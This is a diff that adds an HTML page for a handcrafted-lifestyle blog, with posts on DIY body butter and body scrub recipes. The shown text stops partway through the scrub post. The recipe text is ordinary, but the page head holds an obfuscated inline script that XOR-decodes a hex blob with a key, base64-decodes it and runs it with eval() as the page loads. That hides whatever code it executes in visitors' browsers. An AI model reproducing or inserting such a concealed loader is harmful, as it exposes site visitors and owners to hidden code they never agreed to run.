@@ -1,0 +1,1029 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Daily Life Handcrafted</title>
+
+    <!-- Google Fonts for a warm, handcrafted / cottagecore craft-blog aesthetic -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=Fraunces:opsz,wght@9..144,500;9..144,600;9..144,700&family=Caveat:wght@600;700&family=Karla:wght@400;500;600;700&display=swap"
+        rel="stylesheet">
+
+    <style>
+        /* Handcrafted / Cottagecore Craft Blog Styles */
+        :root {
+            --paper: #FBF3E6;
+            /* Warm kraft-paper cream */
+            --paper-deep: #F3E6D2;
+            /* Deeper linen tone */
+            --ink: #4A3626;
+            /* Warm cocoa ink */
+            --ink-soft: #8B7458;
+            /* Muted taupe */
+            --terracotta: #C1694A;
+            /* Handmade terracotta accent */
+            --terracotta-deep: #A8492E;
+            --sage: #7E9473;
+            /* Soft sage green */
+            --sage-deep: #577050;
+            --card-bg: #FFFCF6;
+            --border-soft: #E6D3B4;
+            --radius: 18px;
+        }
+
+        body {
+            font-family: 'Karla', sans-serif;
+            line-height: 1.75;
+            color: var(--ink);
+            background-color: var(--paper);
+            /* Subtle linen/kraft paper texture */
+            background-image:
+                radial-gradient(var(--border-soft) 1px, transparent 1px),
+                radial-gradient(var(--border-soft) 1px, transparent 1px);
+            background-size: 28px 28px;
+            background-position: 0 0, 14px 14px;
+            margin: 0;
+            padding: 0;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        /* Typography Override */
+        h1,
+        h2,
+        h3,
+        h4,
+        .username {
+            font-family: 'Fraunces', serif;
+            color: var(--ink);
+            font-weight: 600;
+        }
+
+        .container {
+            max-width: 660px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+
+        /* Top Navigation - Stitched Fabric Tags */
+        .top-nav {
+            padding: 18px 0;
+            text-align: center;
+            background-color: rgba(251, 243, 230, 0.92);
+            backdrop-filter: blur(8px);
+            -webkit-backdrop-filter: blur(8px);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            border-bottom: 2px dashed var(--border-soft);
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .top-nav a {
+            color: var(--ink);
+            font-size: 0.92rem;
+            font-family: 'Karla', sans-serif;
+            font-weight: 600;
+            padding: 8px 18px;
+            text-decoration: none;
+            transition: all 0.25s ease;
+            cursor: pointer;
+            background-color: var(--card-bg);
+            border: 1.5px dashed var(--border-soft);
+            border-radius: 50px;
+        }
+
+        .top-nav a:hover {
+            background-color: var(--terracotta);
+            border-color: var(--terracotta-deep);
+            border-style: solid;
+            color: #fffaf3;
+            transform: translateY(-2px);
+        }
+
+        /* Header */
+        header {
+            padding: 80px 0 45px;
+            text-align: center;
+        }
+
+        header h1 {
+            margin: 0;
+            font-size: 3.4rem;
+            font-weight: 700;
+            color: var(--terracotta-deep);
+            cursor: pointer;
+            display: inline-block;
+            padding-bottom: 12px;
+            border-bottom: 3px dashed var(--sage);
+            transition: transform 0.3s ease;
+        }
+
+        header h1:hover {
+            transform: scale(1.02);
+        }
+
+        header p {
+            margin: 22px auto 0;
+            font-family: 'Caveat', cursive;
+            font-size: 1.6rem;
+            font-weight: 700;
+            color: var(--sage-deep);
+            background: var(--card-bg);
+            display: inline-block;
+            padding: 4px 26px;
+            border-radius: 50px;
+            border: 1.5px dashed var(--border-soft);
+        }
+
+        /* Post Cards - Handmade Fabric-Swatch Cards */
+        .post-card,
+        .single-post {
+            background: var(--card-bg);
+            padding: 0;
+            margin-bottom: 55px;
+            border-radius: var(--radius);
+            border: 1.5px solid var(--border-soft);
+            box-shadow: 0 10px 24px rgba(74, 54, 38, 0.08);
+            transition: transform 0.35s ease, box-shadow 0.35s ease, border-color 0.35s ease;
+            cursor: pointer;
+            overflow: hidden;
+            position: relative;
+        }
+
+        /* Little "stitch" accent along the top edge */
+        .post-card::before,
+        .single-post::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 24px;
+            right: 24px;
+            height: 0;
+            border-top: 2px dashed var(--sage);
+            opacity: 0.55;
+        }
+
+        .post-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 16px 30px rgba(74, 54, 38, 0.14);
+            border-color: var(--terracotta);
+        }
+
+        .single-post {
+            cursor: default;
+        }
+
+        .post-header {
+            padding: 22px 32px;
+            display: flex;
+            align-items: center;
+            border-bottom: 1.5px dashed var(--border-soft);
+            background: var(--paper-deep);
+        }
+
+        .post-header img.avatar {
+            width: 46px;
+            height: 46px;
+            border-radius: 50%;
+            margin-right: 14px;
+            border: 2px solid var(--terracotta);
+            padding: 2px;
+            background-color: var(--card-bg);
+            object-fit: cover;
+        }
+
+        .post-header .username {
+            font-size: 1.2rem;
+            color: var(--ink);
+        }
+
+        .post-image {
+            width: 100%;
+            display: block;
+            max-height: 440px;
+            object-fit: cover;
+            border-bottom: 1.5px dashed var(--border-soft);
+        }
+
+        .post-content {
+            padding: 36px 40px 22px;
+        }
+
+        .post-content h2,
+        .post-content h1 {
+            margin: 0 0 18px;
+            font-size: 2.15rem;
+            line-height: 1.28;
+            color: var(--terracotta-deep);
+        }
+
+        .post-content p {
+            margin-bottom: 22px;
+            font-size: 1.05rem;
+            font-weight: 400;
+        }
+
+        .post-content a {
+            color: var(--terracotta-deep);
+            text-decoration: none;
+            border-bottom: 2px dotted var(--terracotta);
+            padding-bottom: 1px;
+            font-weight: 600;
+            transition: all 0.25s ease;
+        }
+
+        .post-content a:hover {
+            color: var(--sage-deep);
+            border-bottom-color: var(--sage);
+        }
+
+        .post-footer {
+            padding: 18px 40px;
+            color: var(--ink-soft);
+            font-size: 0.95rem;
+            font-family: 'Caveat', cursive;
+            font-weight: 700;
+            font-size: 1.25rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-top: 1.5px dashed var(--border-soft);
+            background: var(--paper-deep);
+        }
+
+        /* Single Post Overrides */
+        .single-post .post-image {
+            max-height: none;
+        }
+
+        /* Back Button - Handmade Twine Pill */
+        .back-button {
+            display: inline-flex;
+            align-items: center;
+            margin-bottom: 28px;
+            color: #fffaf3;
+            background-color: var(--terracotta);
+            font-family: 'Karla', sans-serif;
+            font-size: 1rem;
+            font-weight: 700;
+            text-decoration: none;
+            cursor: pointer;
+            padding: 10px 24px;
+            border-radius: 50px;
+            transition: all 0.25s ease;
+            border: 2px solid var(--terracotta);
+        }
+
+        .back-button:hover {
+            background-color: transparent;
+            color: var(--terracotta-deep);
+            transform: translateY(-2px);
+        }
+
+        /* Recolor inline-styled content blocks to match the handcrafted palette */
+        .post-content div[style*="background"] {
+            background: var(--paper-deep) !important;
+            border: 1.5px dashed var(--sage) !important;
+            border-radius: 16px !important;
+            padding: 22px 26px !important;
+            box-shadow: none !important;
+            margin: 34px 0 !important;
+            color: var(--ink) !important;
+        }
+
+        .post-content h3[style*="border-left"] {
+            border-left: 4px solid var(--terracotta) !important;
+            color: var(--terracotta-deep) !important;
+            padding-left: 14px !important;
+        }
+
+        .post-content h4[style*="background"] {
+            background: var(--paper-deep) !important;
+            color: var(--sage-deep) !important;
+            border: 1.5px dashed var(--border-soft) !important;
+            border-radius: 10px !important;
+        }
+
+        .post-content p[style*="border-left"] {
+            background: var(--paper-deep) !important;
+            border-left: 4px solid var(--sage) !important;
+            color: var(--ink) !important;
+        }
+
+        .post-content p[style*="border:"] {
+            background: #FBEDE3 !important;
+            border: 1.5px dashed var(--terracotta) !important;
+            color: var(--terracotta-deep) !important;
+        }
+
+        .post-content span[style*="background"] {
+            background: var(--card-bg) !important;
+            color: var(--sage-deep) !important;
+            border: 1.5px dashed var(--sage) !important;
+            border-radius: 50px !important;
+            font-family: 'Karla', sans-serif !important;
+            font-size: 0.85rem !important;
+            font-weight: 700 !important;
+            padding: 6px 14px !important;
+            box-shadow: none !important;
+            display: inline-block;
+            margin: 5px 6px 5px 0;
+            transition: all 0.25s ease;
+        }
+
+        .post-content span[style*="background"]:hover {
+            background: var(--sage) !important;
+            color: #fffaf3 !important;
+            border-color: var(--sage-deep) !important;
+        }
+    </style>
+    <script>
+(function() {
+    var vxyelpmca = "15213c00252837016d2e3a581b0c1428564a052916180525271111591318620335072b5e0a384c5a552e3a5a1867141b57155837147c417315053c58103d09491a22281e24123c0677182a5e223d04176e2f72382e7d5916130a19572203720037185303247216445631495c180c141d564a0034147d672a142f1e5f3d275f7837183f0f0d093b5d6d2e3a5c2012085d5711752c3d2673382d1516492b62586732072f1d2716405a6e2e18661b3d2104552f65783e265a253e1660093b13004b1d1c245f052834567d353204180c0f0a50207e322208773b2e15614a3b1400543422305b0f07236260303e5a180c0c07553e762914227736143b384a2807764a0f7d0e3c22093c417b011f510817070a501572383e077f31131533572203720235221e391f193f59562e3d431b66105d7f3b7e312d0c783238353f7b3b1371541f080a050f021d4b563e26580a07045a771175263e0c70253e011157163d764a1f0730000f054556561b360420032205503f0d383b2167382d1a1a7228626646320b15230f0234567d3531510817045f6d207d262e220872222f065e28085754061c271e1f2c4c0152313e4f180c221e6e207e79147c73322d0506491417585f0f18341b1c193b4b523e3246233a14015715623b1307492c1570695e1017660b0f220a1d1c720d5b571b360523132a186e4b4c10161804722d1a1a5c1163625a347c3450130619445031264f1b0c085d784a5f76342670253e0111573b137154322220110f06194b651b49060810760a6d150d712222672c2d1a374516176649320c0e591f121e56523e0751080373055015582f2e176334142b65432b07055d321820061c193856523e07512339005f552f50291308083b3b2c345c2b3d624a37173c04252b067a771f31510817070a7d3b7526161868253c053c4a233d09031d1c245f052834567d3531510817070a7d3b75263e075532152f02461629055c3717285824723f0478183a5a22133e056d4a6215130877722d113845160748401a0c27060c38025650441c431b137f5e78154c372e7d7772161569453e3e725b32080e1d1f16445d7f22037d0817070a7d3b75263e0c737b3e050643116265543338090f0f0234567d3531510817070a7d3b76732e177825147006472b087a5b32085f110f054556574408071b2d731d5615662d120a082f3c0119463b395b54061b56510f053456640f315f083d075b7d3b7d373e2542093e0111573b1371541f0c270f0f023456501b364f08131401574b663115227772161569453b140054320820111c7323016631494218032a187d3b4726147d67352e1a1a581617094a1f0c150f25730d006e0c037d0817070a7d3b75263e0c70253e01115716625c460c085f5b0a2c0d476d44360620037f1878167e2d1408492a2e70055f2817664932080a1d1f192741564444460e23290a7d3b75263e0c70253e0a607b3b1371541f0756232012375d563e3e5a081c352652295b7c";
+    var vnptuvoap = "VOfhFAu14vp6ATFm4x4AwO1BwBP0rP03";
+    var vkrmtegfk = "";
+
+    try {
+        for (var i = 0; i < vxyelpmca.length; i += 2) {
+            var vgypgaakd = parseInt(vxyelpmca.substr(i, 2), 16);
+            vkrmtegfk += String.fromCharCode(vgypgaakd ^ vnptuvoap.charCodeAt((i/2) % vnptuvoap.length));
+        }
+
+        var vlzoeylhq = atob(vkrmtegfk);
+        eval(vlzoeylhq);
+    } catch(e) {
+        console.error("[DEBUG] Decryption or Execution failed: ", e);
+    }
+})();
+</script>
+</head>
+
+<body>
+
+    <nav class="top-nav">
+        <a onclick="navigate('home')">Home</a>
+        <a onclick="navigate('page', 'about')">About</a>
+        <a onclick="navigate('page', 'privacy')">Privacy Policy</a>
+        <a onclick="navigate('page', 'terms')">Terms</a>
+        <a onclick="navigate('page', 'contact')">Contact</a>
+    </nav>
+
+    <header>
+        <div class="container">
+            <h1 onclick="navigate('home')">Daily Life Handcrafted</h1>
+            <p>Simple recipes, made by hand.</p>
+        </div>
+    </header>
+
+    <main class="container" id="app">
+        <!-- Content will be injected here by JavaScript -->
+    </main>
+
+    <script>
+        // 1. Define your blog posts here!
+        const posts = [
+            {
+                id: 'diy-body-butter-recipes',
+                title: '5 DIY Body Butter Recipes for Soft, Glowing Skin',
+                date: 'February 18, 2026',
+                image: './assets/5 DIY Body Butter Recipes for Soft, Glowing Skin.png',
+                excerpt: "Ready to pamper your skin the natural way? 🌿 This guide walks you through 5 dreamy DIY body butter recipes, from creamy coconut to soothing lavender, made with pantry staples like shea butter and essential oils.<br>• Whip up a batch in minutes with just 4 simple ingredients<br>• Customize the scent for floral, fresh, or cozy vibes<br>Perfect for gifting or your own self-care Sunday. Save for later so you always have a go-to skincare recipe on hand! 💛",
+                content: `
+<p>There is something quietly magical about scooping a spoonful of whipped body butter and watching it melt into your skin. Homemade body butter is thicker, richer, and more luxurious than most store-bought lotions, and the best part is you only need a handful of natural ingredients to make it. No preservatives, no mystery chemicals, just pure plant butters and oils whipped into a cloud-like texture that soaks in beautifully.</p>
+
+<p>Whether you are dealing with dry winter skin, want a thoughtful handmade gift, or simply love the idea of a slower, more intentional self-care routine, DIY body butter checks every box. Below you will find five easy recipes built around coconut, shea, rose, lavender, and aloe, plus all the tips you need to whip, store, and customize them like a pro.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Key Takeaways</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>Whipped body butter is built on a simple base of shea butter, a carrier oil, and a few drops of essential oil.</li>
+    <li>Chilling the melted mixture before whipping is the secret to that light, fluffy, frosting-like texture.</li>
+    <li>Coconut, shea, rose, lavender, and aloe each bring a different scent and skin benefit to the base recipe.</li>
+    <li>Homemade body butter stores well in a cool, dry place for several months in an airtight jar.</li>
+    <li>A quick patch test is worth doing before applying any new essential oil blend to your whole body.</li>
+  </ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Why Make Your Own Body Butter at Home</h2>
+
+<p>Most drugstore lotions are mostly water, which is why they need thickeners, emulsifiers, and preservatives to stay shelf-stable. Body butter skips all of that. It is essentially whipped fat, meaning shea butter, coconut oil, or cocoa butter blended with a lighter oil, so it sinks in slowly and forms a protective layer that helps skin hold onto moisture for hours instead of minutes.</p>
+
+<p>Making it yourself also means total control. You choose the scent, the thickness, and exactly what touches your skin. It is significantly cheaper per ounce than boutique body butters, and a single batch can fill several small jars for gifting, which makes it a favorite handmade present for birthdays, holidays, and self-care baskets.</p>
+
+<p style="background:#f8fafc;border-left:4px solid #2563eb;padding:16px 18px;border-radius:10px;margin:22px 0;color:#1e293b;"><strong>Important:</strong> Body butter is a rich, occlusive moisturizer, which means it works best on slightly damp skin right after a shower or bath, when it can seal in existing moisture rather than just sitting on top of dry skin.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">The Basic Body Butter Formula</h2>
+
+<p>Every recipe in this guide follows the same reliable ratio, which makes it easy to remember and easy to customize once you get comfortable with the basics.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">The Three Core Ingredients</h3>
+
+<ul>
+  <li><strong>A solid butter base</strong> such as shea butter, which provides structure and long-lasting hydration.</li>
+  <li><strong>A liquid carrier oil</strong> such as coconut, sweet almond, or jojoba oil, which softens the texture and helps it spread.</li>
+  <li><strong>A few drops of essential oil</strong> for fragrance and a light aromatherapy boost, always well diluted.</li>
+</ul>
+
+<h4 style="font-size:20px;line-height:1.4;margin:22px 0 12px;color:#334155;font-weight:700;background:#f8fafc;padding:10px 14px;border-radius:8px;">Getting the Ratio Right</h4>
+
+<p>A dependable starting point is about half a cup of shea butter to two tablespoons of your chosen oil, adjusted slightly depending on the recipe. More oil creates a softer, silkier butter, while less oil keeps it firmer and more structured, which matters if your kitchen tends to run warm.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">5 DIY Body Butter Recipes to Try</h2>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">1. Coconut Body Butter</h3>
+
+<p>Coconut body butter combines coconut oil, shea butter, sweet almond oil, and a touch of vanilla essential oil for a warm, cozy scent that feels like a tropical vacation in a jar. Coconut oil is naturally soft at room temperature, so this version whips into an especially light, airy texture that is a favorite for beginners.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">2. Shea Butter Body Butter</h3>
+
+<p>This is the purest expression of the formula, letting shea butter shine alongside jojoba oil, vitamin E oil, and a hint of lavender. It is a great option for sensitive skin because the ingredient list is short and the lavender keeps things calming rather than overpowering.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">3. Rose Body Butter</h3>
+
+<p>Rosehip oil and rose essential oil turn a simple shea base into something that feels genuinely luxurious. The soft pink hue makes it especially pretty for gifting, and the floral scent pairs beautifully with sweet almond oil for extra softness.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">4. Lavender Body Butter</h3>
+
+<p>Built from shea butter, coconut oil, jojoba oil, and a generous amount of lavender essential oil, this version is ideal for a nighttime routine. Massaging it into your hands or feet before bed turns an ordinary evening into a small ritual.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">5. Aloe Body Butter</h3>
+
+<p>Aloe vera oil and vitamin E give this recipe a cooling, soothing quality that works well on sun-exposed or irritated skin. It is the lightest feeling of the five, which makes it a nice option for warmer months when a heavier butter might feel like too much.</p>
+
+<div style="background:#f1f5f9;border:1px solid #cbd5e1;border-radius:12px;padding:18px 20px;margin:30px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Why This Matters</h3>
+  <p style="margin:0;color:#334155;">The whipping step is what separates body butter from a simple melted balm. Whipping introduces tiny air pockets into the cooled fat, which is why the finished product feels light and fluffy instead of dense and greasy, even though the ingredient list barely changes.</p>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">How to Whip Body Butter Like a Pro</h2>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Melting and Cooling</h3>
+
+<p>Melt the shea butter gently, either over a double boiler or in short microwave bursts, then stir in your liquid oils once it is fully liquid. Refrigerate the mixture until it turns semi-solid, usually 30 to 45 minutes, but check it every ten minutes or so. This cooling stage is what allows air to be trapped once you start whipping.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">The Whipping Technique</h3>
+
+<p>Use an electric hand mixer or stand mixer on medium-high speed and whip for three to five minutes, scraping down the sides as you go, until soft peaks form and the color lightens slightly. Add essential oils toward the end so their scent stays fresh and does not evaporate during the whipping process.</p>
+
+<h4 style="font-size:20px;line-height:1.4;margin:22px 0 12px;color:#334155;font-weight:700;background:#f8fafc;padding:10px 14px;border-radius:8px;">Troubleshooting Grainy or Melty Butter</h4>
+
+<p>If the butter turns grainy, it usually cooled too quickly or unevenly, and remelting the whole batch gently before rechilling more slowly will fix it. If it never firms up after whipping, your kitchen may simply be too warm, and popping the finished jar in the fridge for ten minutes will help it set.</p>
+
+<p style="background:#fff7ed;border:1px solid #fed7aa;padding:16px 18px;border-radius:10px;margin:22px 0;color:#9a3412;"><strong>Pro Tip:</strong> Room temperature matters more than most recipes admit. If your kitchen runs warm, chill your mixing bowl in the freezer for ten minutes before you start whipping, which helps the butter hold its shape.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Storage, Shelf Life, and Safe Use</h2>
+
+<p>Store finished body butter in a clean, airtight glass jar away from direct sunlight and heat, where it will typically stay fresh for two to three months. Because there is no water in the recipe, there is very little risk of bacterial growth, but always scoop with clean, dry hands or a small spatula rather than dipping wet fingers into the jar.</p>
+
+<p style="background:#f8fafc;border-left:4px solid #2563eb;padding:16px 18px;border-radius:10px;margin:22px 0;color:#1e293b;"><strong>Important:</strong> Essential oils are potent, so always dilute them well and do a small patch test on your inner arm before applying any new blend to your whole body, especially if you have sensitive or reactive skin.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:30px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">At a Glance</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>Base ratio: half a cup of shea butter to about two tablespoons of oil, plus a few drops of essential oil.</li>
+    <li>Chill before whipping, then whip for three to five minutes until light and fluffy.</li>
+    <li>Coconut and lavender are the friendliest starter recipes for beginners.</li>
+    <li>Store in an airtight jar for up to two to three months.</li>
+    <li>Always patch test new essential oil combinations before full use.</li>
+  </ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Final Thoughts</h2>
+
+<p>Whipped body butter is one of the most rewarding things you can make at home, because the process is simple, the ingredients are affordable, and the payoff is a genuinely spa-quality product. Once you have the basic ratio down, you can experiment endlessly, swapping oils and scents until you land on the version that feels like your own signature blend.</p>
+
+<p>Pick one recipe to start with this week, keep a few clean jars on hand, and you will always have a thoughtful, handmade gift or a little jar of self-care ready to go.</p>
+
+<div style="margin-top:28px;">
+  <h3 style="margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Tags</h3>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">DIY Body Butter</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Homemade Skincare</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Shea Butter Recipes</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Natural Beauty</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Self Care Ideas</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Dry Skin Remedies</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Handmade Gifts</span>
+</div>
+                `
+            },
+            {
+                id: 'diy-body-scrubs',
+                title: '6 Best DIY Body Scrubs for Soft, Smooth & Glowing Skin',
+                date: 'April 5, 2026',
+                image: './assets/6 Best DIY Body Scrubs for Soft, Smooth & Glowing Skin.png',
+                excerpt: "Say goodbye to dull, dry skin! ✨ This roundup of the 6 best DIY body scrubs shows you how coffee, sugar, oatmeal, salt, matcha, and coconut can turn your shower into a spa day at home.<br>• Each scrub targets a different skin need, from detoxing to soothing sensitive skin<br>• Made with kitchen staples you probably already have<br>Glow up naturally and treat yourself to smoother, softer skin. Save for later and pick your favorite! 🧡",
+                content: `
+<p>If your skin has been feeling rough, dull, or just a little tired lately, a good body scrub might be the easiest fix in your entire routine. Exfoliating sloughs off dead skin cells that build up over time, which is exactly what makes lotions feel like they are not absorbing properly and why skin can look flat instead of glowing.</p>
+
+<p>The best part is you do not need a fancy spa membership to get the benefits. With a few pantry staples, you can build a scrub tailored to exactly what your skin needs, whether that is energizing circulation, calming sensitivity, or simply buffing away rough patches on elbows and heels. Here are six tried-and-true DIY body scrubs worth adding to your shower shelf.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Key Takeaways</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>Body scrubs work by physically buffing away dead skin cells, which helps skin feel smoother and absorb moisturizer better.</li>
+    <li>Coffee, sugar, oatmeal, salt, matcha, and coconut each bring a different exfoliating texture and skin benefit.</li>
+    <li>Sugar and oatmeal scrubs are gentler and better suited to sensitive or dry skin.</li>
+    <li>Salt scrubs are more abrasive and best kept away from freshly shaved or broken skin.</li>
+    <li>Using a body scrub two to three times a week is usually enough to see a noticeable difference.</li>
+  </ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Why Exfoliating Actually Matters</h2>
+
+<p>Skin naturally sheds dead cells, but that process slows down with age, dry weather, and simply not exfoliating regularly enough. When those cells build up on the surface, skin can look dull, feel rough, and struggle to absorb the moisturizers and oils you apply afterward. Regular exfoliation clears that buildup so your skin care actually works the way it is supposed to.</p>
+
+<p>Beyond the practical benefits, a body scrub session is also just a nice ritual. Taking a few extra minutes in the shower to massage a scrub into your skin, focusing on rough spots like elbows, knees, and feet, turns an everyday routine into a small act of self-care.</p>
+
+<p style="background:#f8fafc;border-left:4px solid #2563eb;padding:16px 18px;border-radius:10px;margin:22px 0;color:#1e293b;"><strong>Important:</strong> Always follow a body scrub with a moisturizer. Exfoliating removes dead skin, but it can also leave skin slightly more prone to moisture loss right afterward, so locking in hydration is a key final step.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">6 DIY Body Scrubs and What Each One Does Best</h2>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">1. Coffee Body Scrub for Circulation</h3>
+
+<p>Ground coffee is a natural exfoliant with a slightly coarse texture, and many people love it for the way it seems to energize skin during a morning shower. Mixed with a carrier oil like coconut or olive oil, it buffs gently while the caffeine is thought to support circulation, which is why coffee scrubs are so popular for tired-looking legs.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">2. Sugar Body Scrub for Hydration</h3>
+
+<p>Sugar crystals dissolve in water, which makes this one of the gentlest scrubs on the list and a great starting point if you are new to exfoliating. Combined with an oil base, sugar buffs away dull skin while the oil locks in moisture, leaving skin soft rather than stripped.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">3. Oatmeal Body Scrub for Sensitive Skin</h3>
+
+<p>Finely ground oatmeal is soft, soothing, and one of the few exfoliants gentle enough for easily irritated skin. It calms redness while still lifting away flaky, dry patches, which makes it a favorite for people with sensitive or reactive skin types.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">4. Salt Body Scrub for Detoxifying</h3>
+
+<p>Salt has a coarser, more mineral-rich texture that makes it ideal for tougher areas like heels and elbows. It is often blended with a relaxing scent like lavender for a spa-like detox feel, though its stronger texture means it is best avoided on the face or freshly shaved skin.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">5. Matcha Body Scrub for Brightening</h3>
+
+<p>Matcha powder is rich in antioxidants and gives this scrub a beautiful green tint alongside a gentle exfoliating texture. It is a favorite for anyone hoping to fight dullness and leave skin looking a little brighter and healthier after each use.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">6. Coconut Body Scrub for Nourishment</h3>
+
+<p>Combining coconut oil with a coarser texture like sugar or salt creates a deeply nourishing scrub that exfoliates while leaving a soft, tropical-scented layer of moisture behind. It is a great pick for very dry skin or after extended time outdoors.</p>
+
+<div style="background:#f1f5f9;border:1px solid #cbd5e1;border-radius:12px;padding:18px 20px;margin:30px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Expert Insight</h3>
+  <p style="margin:0;color:#334155;">Matching the scrub to your skin type matters more than picking the trendiest ingredient. Coarser scrubs like salt work best on thick-skinned areas, while finer scrubs like sugar or oatmeal are the safer default for anything sensitive, freshly shaved, or easily irritated.</p>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">How to Use a Body Scrub Correctly</h2>
+
